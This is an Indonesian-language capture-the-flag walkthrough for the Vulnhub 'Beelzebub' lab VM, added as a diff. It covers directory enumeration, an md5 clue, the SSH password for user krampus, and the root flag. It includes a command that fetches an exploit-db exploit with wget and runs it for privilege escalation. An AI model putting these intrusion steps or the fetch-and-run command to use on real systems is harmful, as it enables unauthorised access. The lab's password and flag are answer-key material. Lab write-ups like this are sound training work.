@@ -1,0 +1,25 @@
+Walkthrough Vulnhub Beelzebub
+
+1. Oke untuk yang pertama kali seperti biasa scan ip dulu supaya tau ip mana vm yang ingin kita serang. Dan next aja kita scan directory dan dapetlah ini :
+/index.html (Status: 200)
+/index.php (Status: 200)
+/javascript (Status: 301)
+/phpmyadmin (Status: 301)
+/phpinfo.php (Status: 200)
+/server-status (Status: 403)
+
+2. Next cek satu satu dan terdapa clue di index.php :
+<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->
+
+3. Karna itu sung aja ku encode ke md5 dan dapat lah ini d18e1e22becbd915b45e0e655429d487. Oya untuk hash ini ku pake ke directory dan setelah di scan lagi terdapat ini gan :
+/index.php (Status: 200)
+/themes (Status: 301)
+/uploads (Status: 301)
+/plugins (Status: 301)
+/upgrade (Status: 301
+
+4. Ku cek langsung dan ku masuk ke direcoty uploads ada talk to valak dan pas ku masuk ke directory itu kita dapat password ssh krampus : M4k3Ad3a1. Sebelum dapetin passwordnya ketik apa aja dulu buat syarat wkwkw
+
+5. Login ssh dan ketika sudah masuk langsung aja lihat .bash_history dan ternyata ada history donwload backdoor kalau gak salah vulnya itu privilege escalation : wget https://www.exploit-db.com/download/47009 -O exploit.c; ./exploit [Jangan lupa ke /tmp kawan]
+
+6. Kalau udah masuk gass aja ke /root dan dapet flagnya : 8955qpasq8qq807879p75e1rr24cr1a5
